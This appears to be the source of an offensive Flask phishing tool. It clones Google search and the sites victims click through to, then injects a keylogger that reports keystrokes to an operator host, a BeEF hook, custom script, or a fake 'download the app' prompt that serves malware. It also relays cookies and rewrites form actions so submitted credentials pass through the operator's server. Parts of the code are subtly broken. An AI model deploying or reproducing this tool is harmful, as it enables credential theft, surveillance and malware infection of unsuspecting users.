#-*-coding: utf-8-*-
#imports
from flask import Flask, request, render_template, send_file, make_response
from flask_cors import CORS
import requests  
from shutil import copyfile
from codecs import open as copen
from platform import platform
from os import path
from bs4 import BeautifulSoup
#clone.py comes with hookline
import gclone

#OS configuration stuff
current_platform = platform()
IS_WINDOWS = False
if current_platform.startswith("Windows"):
	IS_WINDOWS = True


#display banner
b = open("banner.txt","r")
print(b.read())
b.close



#the flask server will run on this ip and port
h = input("ip to run on: ")
p = input("port to run on: ")
maldown=""
ipb=""

#menu
print('''
prebuilt pages will not be injected since you may want to use them for custom attacks.
you may however find the script you wish to use and add it to the bottom of your html file.
to use premade pages simply place your html file in the templates folder as <search term>.html 

1. inject keylogger (writes to keys.txt)
2. inject BeEF hook
3. inject custom html or js from file
4. browser is not supported download the app (your malware)
	''')

#choose here
opt = int(input("option: "))

#inject keylogger
if opt == 1:
	#if you are using ngrok etc specify 
	ipb = input("\nip to log keys to (leave blank for same ip): ")
	portb = input("port to log keys to (leave blank for same ip): ")
	if not ipb:
		ipb = h
		print("\nusing same ip")
	if not portb:
		portb = p
		print("using same port")

#inject BeEF hook
if opt == 2:
	beef_ip=input("BeEF ip: ")
	beef_port=input("BeEF port: ")
	bhooktmp = open("bhook.js","r")
	bhooktmpr = bhooktmp.read()
	bhooktmp.close()
	bhooktmpr = bhooktmpr.replace("~bip~",beef_ip).replace("~bport~",beef_port)
	if IS_WINDOWS:
		bhook = open("static\\js\\bhook.js", "w")
	else:
		bhook = open("static/js/bhook.js","w")
	bhook.write(bhooktmpr)
	bhook.close()

#inject custom html or js
if opt == 3:
	injfname=input("filename: ")

if opt == 4:
	maldown=input("filename: ")
	ipb = input("\nip to download from (leave blank for same ip): ")
	portb = input("port to log keys to (leave blank for same ip): ")
	if not ipb:
		ipb = h
		print("\nusing same ip")
	if not portb:
		portb = p
		print("using same port")
print('''
	popunder location /u (might not work well on firefox sollution coming in v2.0)
	google search location / 
	''')

#initialise app and enable CORS so the keylogger works
app = Flask(__name__)
CORS(app)

#this is so that the fake google search will update live etc
app.config["TEMPLATES_AUTO_RELOAD"] = True

#robots
@app.route("/robots.txt")
def robots():
	return "User-agent: *\rDisallow: *"

#serve tabunder from the yesup popunder library
@app.route("/u")
def u():
	return render_template("under.html")

#serve google seach 
@app.route("/search")
def search(maldown=maldown):
	search_query = request.args.get("q")

	if IS_WINDOWS:
		template = path.isfile(f"templates\\{search_query}.html")
	else:
		template = path.isfile(f"templates/{search_query}.html")

	#clone google search
	gclone.clone(search_query, template)
	#Search2.html is served after being updated by clone
	f = open("activesearch.txt","w")
	f.write(search_query)
	f.close()
	if opt == 4:
		if "/" not in search_query and "\\" not in search_query:
			copyfile(maldown,search_query+"."+maldown.split(".")[1])
			maldown = search_query+"."+maldown.split(".")[1]
	return send_file("templates/Search2.html")

#serves premade pages
@app.route("/temp")
def tempfunc():
	tempf = request.args.get("temp")
	return render_template(tempf+".html")

#generates fake versions on link click
@app.route("/link", methods=['GET', 'POST'])
def link():
	url = request.args.get("url")
	if h in url or ipb in url or "127.0.0.1" in url or "localhost" in url or "192.168." in url or "0.0.0.0" in url:
		url="https://en.wikipedia.org/wiki/Idiot"


	#Add add the user headers to the http request.
	headers = {
		"User-Agent": request.headers.get("User-Agent"),
		"Cookie": request.headers.get("Cookie")
	}

	if request.method == 'GET':
		r = requests.get(url, allow_redirects=False, headers=headers)

	elif request.method == 'POST':

		if not "original_url" in request.form:
			return redirect(f"/link?url={url}")

		action = request.form['original_url']

		#Parse the action to send the data to the right url.

		#Add a slash at the end of the url to make it easier to parse.
		if url[-1] != "/":
				url += "/"

		#Remove the uri from the url
		base_url = "//".join(url.split("/")[:3])
		
		if action.startswith("/"):
			post_url = base_url + action

		elif action.startswith("http"):
			post_url = action
		else:
			base_url += "/"
			post_url += baseurl + action
			

		data = request.form
		r = requests.post(post_url, headers=headers, data=data)
	else:
		return "Method not allowed"

	#keylogger
	if opt == 1:
		scrpt = open("script.html","r")
		scrpt1 = scrpt.read().replace("#h#",ipb).replace("#p#",str(portb))
		jsadd = r.text + scrpt1
	
	#BeEF
	if opt == 2:
		if IS_WINDOWS:
			scrpt = open("static\\js\\bhook.js","r")
		else:
			scrpt = open("static/js/bhook.js","r")
		jsadd = r.text + scrpt.read()
	
	#Custom html or js
	if opt == 3:
		scrpt = open(injfname,"r")
		jsadd = r.text + scrpt.read()

	if opt == 4:
		actvsrch = open("activesearch.txt","r")
		sitenm = actvsrch.read()
		actvsrch.close()
		scrpt = open("down.html","r")
		scrpt1 = scrpt.read()
		scrpt1 = scrpt1.replace("*search*",sitenm)
		scrpt1 = scrpt1.replace("*ip*",ipb)
		scrpt1 = scrpt1.replace("*port*",portb)
		jsadd = r.text + scrpt1

	#write out clone with chosen code injected
	if not "<base" in jsadd:
		jsadd = jsadd.replace("<head>",f"<head><base href='{url}'>")

	scrpt.close()

	#Parse the html for post forms.
	jsadd_soup = BeautifulSoup(jsadd, "html.parser")
	forms = jsadd_soup.find_all("form", {"method": "POST"}) + jsadd_soup.find_all("form", {"method": "post"})
	for form in forms:
		original_form = str(form)
		#Modify the post form to send the data to the current location.
		

		original_action = jsadd_soup.new_tag("input")
		original_action['type'] = 'hidden'
		original_action['name'] = 'original_url'
		if "action" in form:
			original_action['value'] = form['action']

		else:
			original_action['value'] = url
		
		form['action'] = f"/link?url={url}"
		form.insert(1, original_action)

		#Replace the form
		jsadd = str(jsadd_soup).replace(original_form, str(form))




	#add the url to our keysfile so we know what site its for
	with open("keys.txt","a") as keyfile:
		keyfile.write(url+"\n")
	keyfile.close()

	#Make response with cookies and modified document.
	response = make_response(jsadd)
	for cookie in r.cookies:
		response.set_cookie(cookie.name, cookie.value, httponly=True)


	#serve the cloned page
	return response


#keylogger
@app.route("/key")
def key():
	keyget = request.args.get("key")
	keyget = keyget.replace(" Key","")
	with copen("keys.txt","a", encoding='utf-8') as keyfile:
		keyfile.write(keyget)
	return "return"

#google search start
@app.route("/")
def index():
	return render_template("Google.html")

@app.route("/download")
def downloads():
	actvsrch = open("activesearch.txt","r")
	sitenm = actvsrch.read()
	actvsrch.close()
	return send_file(sitenm+"."+maldown.split(".")[1])

#run flask app
if __name__ == "__main__":
	app.run(host=h, port=p)

